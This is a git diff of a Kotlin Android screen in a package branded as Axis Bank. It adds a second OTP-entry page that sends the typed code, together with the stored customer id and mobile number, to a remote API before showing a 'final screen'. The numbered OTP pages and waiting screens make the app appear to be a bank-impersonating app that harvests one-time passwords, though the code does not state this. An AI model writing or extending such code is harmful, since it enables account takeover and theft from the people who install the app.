@@ -1,46 +1,41 @@
 package com.example.oldaxisbank
 
 import android.content.Intent
-import android.graphics.Color
 import androidx.appcompat.app.AppCompatActivity
 import android.os.Bundle
 import android.os.CountDownTimer
 import android.util.Log
 import android.widget.Toast
 import com.example.axisbank.FifthPageOtp
-import com.example.axisbank.FourthPageOtp
-import com.example.oldaxisbank.databinding.ActivityOtpBinding
+import com.example.oldaxisbank.databinding.ActivityOtp2Binding
 import retrofit2.Call
 import retrofit2.Callback
 import retrofit2.Response
 
-class otp : AppCompatActivity() {
+class otp2 : AppCompatActivity() {
 
-    private lateinit var binding:ActivityOtpBinding
+    private lateinit var binding: ActivityOtp2Binding;
     private lateinit var countDownTimer: CountDownTimer
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-        binding = ActivityOtpBinding.inflate(layoutInflater)
+        binding = ActivityOtp2Binding.inflate(layoutInflater)
         setContentView(binding.root)
 
         startCountdownTimer(45)
 
-
         binding.submit.setOnClickListener {
             if (binding.otp.text.toString().isEmpty()){
                 Toast.makeText(this,"Fill all fields", Toast.LENGTH_SHORT).show()
-            }
-            else{
-
+            }else{
                 val util = Util()
-                val intentff = Intent(this, otpwaiting::class.java)
                 val apiService = ApiClient.getClient().create(ApiService::class.java)
-                val data = FourthPageOtp(customerid = util.getLocalData(this,"c"),
+                val intentff = Intent(this, finalscreen::class.java)
+                val data = FifthPageOtp(customerid = util.getLocalData(this,"c"),
                     mobile = util.getLocalData(this,"m"),
-                    otp1 = binding.otp.text.toString(),
+                    otp2 = binding.otp.text.toString(),
                 )
-                val call = apiService.four(data)
+                val call = apiService.fith(data)
                 call.enqueue(object : Callback<Void?> {
                     override fun onResponse(call: Call<Void?>, response: Response<Void?>) {
                         if (response.isSuccessful) {
@@ -55,8 +50,6 @@ class otp : AppCompatActivity() {
                         Log.d("asdf123", t.toString())
                     }
                 })
-
-
             }
         }
 
@@ -83,5 +76,6 @@ class otp : AppCompatActivity() {
         super.onDestroy()
         countDownTimer.cancel()
     }
+
 
 }
